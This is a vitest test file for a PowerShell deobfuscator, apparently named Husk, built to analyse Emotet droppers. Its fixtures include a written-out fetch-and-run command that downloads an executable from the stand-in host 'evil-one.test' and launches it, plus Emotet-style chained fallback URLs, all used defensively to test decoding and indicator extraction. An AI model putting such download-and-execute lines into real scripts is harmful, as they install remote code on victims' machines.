import { describe, expect, it } from 'vitest';

import { analyze } from '../analyze';
import { deobfuscate } from '../eval/pipeline';

// Shapes found by running real Emotet droppers through Husk. The samples
// themselves are deliberately not committed - these reproduce the structure
// with benign payloads, which is what the regressions actually need.

const utf16leBase64 = (text: string): string => {
  const bytes = new Uint8Array(text.length * 2);
  for (let i = 0; i < text.length; i += 1) {
    const code = text.charCodeAt(i);
    bytes[i * 2] = code & 0xff;
    bytes[i * 2 + 1] = (code >> 8) & 0xff;
  }
  return btoa(String.fromCharCode(...bytes));
};

describe('a bare base64 blob is a sample, not noise', () => {
  // Real droppers arrive this way constantly: lifted out of a macro or an EDR
  // command-line field with the -enc already stripped. Before this, Husk
  // matched nothing and reported a false clean.
  const payload = `$p = $env:userprofile + '\\403.exe'; $w = New-Object Net.WebClient; $w.DownloadFile('http://evil-one.test/a/','$p'); Invoke-Item $p`;

  it('decodes a bare UTF-16LE blob', async () => {
    const result = await analyze(utf16leBase64(payload));
    expect(result.layers.length).toBeGreaterThan(1);
    expect(result.iocs.indicators.some((i) => i.value.includes('evil-one.test'))).toBe(true);
  });

  it('records the host calls inside it', async () => {
    const result = await analyze(utf16leBase64(payload));
    const signatures = result.events.map((e) => e.signature);
    expect(signatures).toContain('Net.WebClient.DownloadFile');
    expect(signatures).toContain('Invoke-Item');
  });

  it('ignores short or non-base64 text', async () => {
    const result = await analyze('Write-Host "hello"');
    expect(result.layers).toHaveLength(1);
  });
});

describe('a run that matched nothing is never reported as clean', () => {
  // The worst possible outcome: analysing nothing and calling it resolved.
  it('records a gap when no rule matched', async () => {
    const result = await deobfuscate('\u0001\u0002 not powershell at all \u0003');
    expect(result.reliable).toBe(false);
    expect(result.trace.gaps.ranked().some((g) => /no rule matched/.test(g.signature))).toBe(true);
  });

  it('does not fire on an ordinary script that needed no unwrapping', async () => {
    const result = await deobfuscate('Write-Host "hello"');
    expect(result.trace.gaps.ranked().some((g) => /no rule matched/.test(g.signature))).toBe(false);
  });
});

describe('@-separated URL lists', () => {
  // Emotet packs its fallbacks as a@b@c. '@' is legal in a URL, so a greedy
  // match swallowed the whole chain as a single indicator.
  const list =
    "$u = 'http://one.test/aa/@http://two.test/bb/@https://three.test/cc/@http://four.test/dd/'";

  it('splits the chain into separate indicators', async () => {
    const urls = (await analyze(list)).iocs.indicators
      .filter((i) => i.kind === 'url')
      .map((i) => i.value);

    expect(urls).toHaveLength(4);
    expect(urls).toContain('http://one.test/aa/');
    expect(urls).toContain('https://three.test/cc/');
    expect(urls.every((u) => !u.includes('@'))).toBe(true);
  });

  it('keeps a legitimate userinfo @ inside one URL', async () => {
    const urls = (await analyze(`$u = 'http://user:pw@host.test/a'`)).iocs.indicators
      .filter((i) => i.kind === 'url')
      .map((i) => i.value);
    expect(urls).toContain('http://user:pw@host.test/a');
  });
});

describe('hostname fragments are rejected', () => {
  // An intermediate layer can hold a URL split across a concatenation,
  // yielding 'http://madd' - a fragment, not a destination.
  it('drops a host with no dot', async () => {
    const urls = (await analyze(`$a = 'http://madd' + 'inhost.test/x'`)).iocs.indicators
      .filter((i) => i.kind === 'url')
      .map((i) => i.value);
    expect(urls.some((u) => u === 'http://madd')).toBe(false);
  });

  it('keeps a bare IP host', async () => {
    const urls = (await analyze(`$u = 'http://203.0.113.5/a'`)).iocs.indicators
      .filter((i) => i.kind === 'url')
      .map((i) => i.value);
    expect(urls).toContain('http://203.0.113.5/a');
  });
});
